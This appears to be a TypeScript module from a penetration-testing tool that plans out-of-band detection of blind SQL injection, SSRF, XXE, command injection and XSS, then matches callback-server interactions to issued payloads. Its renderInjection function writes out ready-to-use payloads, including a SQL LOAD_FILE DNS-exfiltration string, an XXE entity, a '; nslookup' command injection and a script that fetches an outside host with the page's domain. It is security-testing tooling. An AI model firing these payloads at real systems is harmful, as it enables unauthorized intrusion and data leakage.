/**
 * Out-of-band detector (Shannon F105, Tier F2).
 *
 * Catches injection classes that yield no in-band response (blind
 * SQLi, SSRF, XXE, blind XSS, blind RCE). The pattern is
 * burp-collaborator style: each test gets a unique sub-domain under
 * an operator-controlled callback domain; if the target ever resolves
 * the sub-domain (or makes an HTTP request to it), it confirms code
 * execution / out-of-bound network reach.
 *
 * SECURITY GATE: the operator MUST explicitly supply a
 * collaboratorDomain — there is no default. This keeps T3MP3ST from
 * pointing payloads at a third-party domain by accident.
 *
 * This service is a planner + correlator. It does NOT host the
 * collaborator. The operator is expected to run something like
 * interactsh-client / Burp Collaborator and feed the captured
 * interactions back via `correlateInteractions()`.
 */

import { createHash, randomBytes } from 'node:crypto';

export type OobChannel = 'dns' | 'http' | 'smtp';

export interface OobPayload {
  readonly id: string;
  readonly channel: OobChannel;
  readonly subdomain: string;
  readonly fullDomain: string;
  /** Ready-to-inject payload string for the targeted class. */
  readonly injection: string;
  readonly vulnClass: 'sqli' | 'ssrf' | 'xxe' | 'rce' | 'xss';
}

export interface CollaboratorInteraction {
  readonly subdomain: string;
  readonly channel: OobChannel;
  readonly remoteAddress: string;
  readonly capturedAt: number;
}

export interface OobFinding {
  readonly payloadId: string;
  readonly vulnClass: OobPayload['vulnClass'];
  readonly subdomain: string;
  readonly channel: OobChannel;
  readonly remoteAddress: string;
  readonly capturedAt: number;
}

const SUBDOMAIN_PREFIX_RE = /^[a-z0-9]+$/;

/** Build an out-of-band payload for the given vuln class. */
export function buildOobPayload(opts: {
  readonly collaboratorDomain: string;
  readonly vulnClass: OobPayload['vulnClass'];
  readonly channel?: OobChannel;
}): OobPayload {
  if (!opts.collaboratorDomain) throw new Error('collaboratorDomain is required (operator-supplied)');
  if (!opts.collaboratorDomain.includes('.'))
    throw new Error(`collaboratorDomain must be a FQDN: ${opts.collaboratorDomain}`);
  const channel: OobChannel = opts.channel ?? 'dns';
  const random = randomBytes(6).toString('hex');
  if (!SUBDOMAIN_PREFIX_RE.test(random)) throw new Error('subdomain generator misbehaved');
  const subdomain = `oob${random}`;
  const fullDomain = `${subdomain}.${opts.collaboratorDomain}`;
  const id = createHash('sha256').update(`${fullDomain}:${opts.vulnClass}`).digest('hex').slice(0, 16);
  return {
    id,
    channel,
    subdomain,
    fullDomain,
    injection: renderInjection(opts.vulnClass, channel, fullDomain),
    vulnClass: opts.vulnClass,
  };
}

/**
 * Match a captured interaction (from interactsh-client or burp
 * collaborator) against the set of issued payloads.
 */
export function correlateInteractions(
  payloads: readonly OobPayload[],
  interactions: readonly CollaboratorInteraction[],
): readonly OobFinding[] {
  const bySub = new Map<string, OobPayload>();
  for (const p of payloads) bySub.set(p.subdomain, p);
  const out: OobFinding[] = [];
  for (const i of interactions) {
    const p = bySub.get(i.subdomain);
    if (!p) continue;
    out.push({
      payloadId: p.id,
      vulnClass: p.vulnClass,
      subdomain: p.subdomain,
      channel: i.channel,
      remoteAddress: i.remoteAddress,
      capturedAt: i.capturedAt,
    });
  }
  return out;
}

function renderInjection(vulnClass: OobPayload['vulnClass'], channel: OobChannel, fqdn: string): string {
  const url = channel === 'http' ? `http://${fqdn}/` : `https://${fqdn}/`;
  switch (vulnClass) {
    case 'sqli':
      // MySQL LOAD_FILE-style and PostgreSQL COPY-style DNS exfil
      return `' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',${quote(fqdn)},'\\\\a'))-- `;
    case 'ssrf':
      return url;
    case 'xxe':
      return `<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"${url}\">]><foo>&xxe;</foo>`;
    case 'rce':
      return `; nslookup ${fqdn} ;`;
    case 'xss':
      return `<script>fetch('${url}'+document.domain)</script>`;
  }
}

function quote(s: string): string {
  return `'${s.replace(/'/g, "''")}'`;
}
